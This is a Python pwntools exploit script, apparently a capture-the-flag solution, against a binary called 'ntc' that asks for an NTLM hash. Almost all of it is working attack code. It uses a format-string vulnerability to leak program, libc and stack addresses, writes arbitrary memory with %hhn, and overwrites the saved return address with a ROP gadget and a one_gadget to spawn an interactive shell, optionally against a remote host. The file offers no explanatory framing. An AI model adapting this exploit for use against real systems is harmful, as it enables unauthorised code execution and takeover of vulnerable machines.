#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ntc')
libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x1513
breakrva 0x1527
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def arb_write_8(addr, data):
    payload = b''
    
    if data == 0:
        payload = f"%8$hhn".encode()
    else:
        payload = f"%{data}c%8$hhn".encode()
    
    padding = b'A'*(16-len(payload))
    payload += padding
    payload += p64(addr)

    io.sendline(payload)

def arb_write_64(addr, data):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    
    for i in range(0, len(to_write)):
        arb_write_8(addr+i, to_write[i])


def leak():
    fmt = f"%73$p.%72$p.%76$p".encode()
    io.sendline(fmt)
    io.recvuntil(b"Entrez le hash NTLM : ")
    leak = io.recvline().split(b'.')
    exe.address = int(leak[0], 16) - 0x3d50 # diff offset on remote
    libc.address = int(leak[1], 16) - 0x1d75c0
    stack = int(leak[2][:14], 16) - 0x7b0

    info("elf base: %#x", exe.address)
    info("libc base: %#x", libc.address)
    info("stack leak: %#x", stack)

    return stack

def solve():

    stack_saved_rip = leak()
    pop_rbx = libc.address + 0x28a37 # pop rbx; ret;
    one_gadget = libc.address + 0x4d753

    arb_write_64(stack_saved_rip, pop_rbx)
    arb_write_64(stack_saved_rip + 8, 0x0)
    arb_write_64(stack_saved_rip + 16, one_gadget)

    io.sendline()

    io.interactive()


def main():
    
    init()
    solve()


if __name__ == '__main__':
    main()

